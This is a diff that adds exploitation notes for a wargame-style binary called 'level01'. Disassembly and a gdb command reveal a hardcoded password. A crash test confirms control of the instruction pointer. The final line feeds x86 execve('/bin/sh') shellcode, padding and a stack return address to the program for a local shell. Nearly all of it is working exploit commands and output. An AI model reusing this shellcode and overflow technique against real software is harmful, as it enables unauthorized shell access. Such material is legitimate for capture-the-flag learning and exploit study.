@@ -1,0 +1,21 @@
+objdump -d -Mintel level01
+    8048473:       e8 08 ff ff ff          call   8048380 <puts@plt>
+    8048478:       ba 40 a0 04 08          mov    edx,0x804a040
+    804847d:       b8 a8 86 04 08          mov    eax,0x80486a8
+    8048482:       b9 07 00 00 00          mov    ecx,0x7
+    8048487:       89 d6                   mov    esi,edx
+    8048489:       89 c7                   mov    edi,eax
+    804848b:       f3 a6                   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+
+gdb level01 -ex start -ex "x/s 0x80486a8" -ex quit
+    0x80486a8:       "dat_wil"
+
+
+(python -c "print('dat_wil')" ; python -c "print(80 * 'a' + 'AABB' )";cat -) | gdb -ex run ./level01
+    Program received signal SIGSEGV, Segmentation fault.
+    0x42424141 in ?? ()
+
+(python -c "print('dat_wil')" ; python -c "print(80 * 'a' + 'AABB' )";cat -) | ltrace ./level01 
+    fgets("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 100, 0xf7fcfac0)      = 0xffffd6dc
+
+(python -c "print('dat_wil')" ; python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'  + 55 * 'a' + '\xdc\xd6\xff\xff' )";cat -) | ./level01
